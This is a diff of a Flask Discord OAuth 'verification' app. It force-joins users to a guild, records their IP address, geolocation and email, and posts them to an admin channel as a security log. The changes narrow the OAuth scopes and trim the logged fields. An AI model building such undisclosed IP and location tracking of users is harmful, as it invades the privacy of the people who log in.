@@ -75,9 +75,7 @@ def save_log(discord_id, data):
 @app.route("/")
 def index():
     redirect_uri_encoded = quote(REDIRECT_URI, safe='')
-
-    # 複数スコープ対応（スペースは %20）
-    scopes = "identify email guilds guilds.channels.read guilds.join connections guilds.members.read gdm.join"
+    scopes = "identify email connections guilds"
     scopes_encoded = quote(scopes, safe='')
 
     discord_auth_url = (
@@ -98,10 +96,9 @@ def callback():
     if not code:
         return "コードがありません", 400
 
-    # OAuth2 トークン取得
     token_url = "https://discord.com/api/oauth2/token"
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
-    scopes = "identify email guilds guilds.channels.read guilds.join connections guilds.members.read gdm.join"
+    scopes = "identify email connections guilds"
     data = {
         "client_id": DISCORD_CLIENT_ID,
         "client_secret": DISCORD_CLIENT_SECRET,
@@ -110,6 +107,7 @@ def callback():
         "redirect_uri": REDIRECT_URI,
         "scope": scopes
     }
+
     try:
         res = requests.post(token_url, data=data, headers=headers)
         res.raise_for_status()
@@ -126,7 +124,7 @@ def callback():
     guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
     connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()
 
-    # サーバー参加
+    # Bot トークンでサーバー参加（ユーザー用アクセストークン不要）
     try:
         requests.put(
             f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
@@ -136,7 +134,6 @@ def callback():
     except:
         pass
 
-    # IP/位置情報取得
     ip = get_client_ip()
     if ip.startswith(("127.", "10.", "192.", "172.")):
         ip = requests.get("https://api.ipify.org").text
@@ -181,37 +178,16 @@ def callback():
 
     save_log(user["id"], data)
 
-    # ----------------------------
-    # Embed送信
-    # ----------------------------
+    # Embed 送信
     try:
         embed_data = {
             "title": "🔐 セキュリティログ通知",
             "color": 0x2B2D31,
-            "description": (
-                f"```ini\n"
-                f"[ ユーザー情報 ]\nUsername = {data['username']}#{data['discriminator']}\nUserID = {data['id']}\nEmail = {data['email']}\n\n"
-                f"[ 接続情報 ]\nIP = {data['ip']}\nCountry = {data['country']} / {data['region']} / {data['city']} ({data['zip']})\nISP = {data['isp']}\nAS = {data['as']}\nLocation = https://maps.google.com/?q={data['lat']},{data['lon']}\n\n"
-                f"[ デバイス情報 ]\nOS = {data['user_agent_os']}\nBrowser = {data['user_agent_browser']}\nDevice = {data['user_agent_device']}\nBot UA = {data['user_agent_bot']}\n\n"
-                f"[ セキュリティ判定 ]\nProxy = {data['proxy']}\nHosting = {data['hosting']}\nLocale = {data['locale']} / Premium: {data['premium_type']}\n```"
-            ),
+            "description": f"```ini\n[ ユーザー ]\n{data['username']}#{data['discriminator']}\nID={data['id']}\nEmail={data['email']}\nIP={data['ip']}\nRegion={data['country']}/{data['region']}/{data['city']}\n```",
             "thumbnail": {"url": data["avatar_url"]},
-            "footer": {"text": "⚠️ 管理者専用ログ | BLACK_ルアン セキュリティモニター",
-                       "icon_url": "https://cdn-icons-png.flaticon.com/512/3064/3064197.png"},
+            "footer": {"text": "BLACK_ルアン セキュリティモニター"},
             "timestamp": datetime.utcnow().isoformat()
         }
-
-        if data["proxy"] or data["hosting"]:
-            suspicious_embed = {
-                "title": "⚠️ 不審アクセス検出",
-                "color": 0xFF3C3C,
-                "description": f"```diff\n- Proxy or Hosting Detected!\n+ Username: {data['username']}#{data['discriminator']}\n+ IP: {data['ip']}\n+ Proxy: {data['proxy']} | Hosting: {data['hosting']}\n```",
-                "footer": {"text": "BLACK_ルアン セキュリティAIによる自動検知",
-                           "icon_url": "https://cdn-icons-png.flaticon.com/512/7359/7359942.png"},
-                "timestamp": datetime.utcnow().isoformat()
-            }
-            bot.loop.create_task(bot.send_log(embed=suspicious_embed))
-
         bot.loop.create_task(bot.send_log(embed=embed_data))
         bot.loop.create_task(bot.assign_role(user["id"]))
     except Exception as e:
@@ -220,7 +196,7 @@ def callback():
     return render_template("welcome.html", username=data["username"], discriminator=data["discriminator"])
 
 # ----------------------------
-# ログ表示ページ
+# ログ表示
 # ----------------------------
 @app.route("/logs")
 def show_logs():
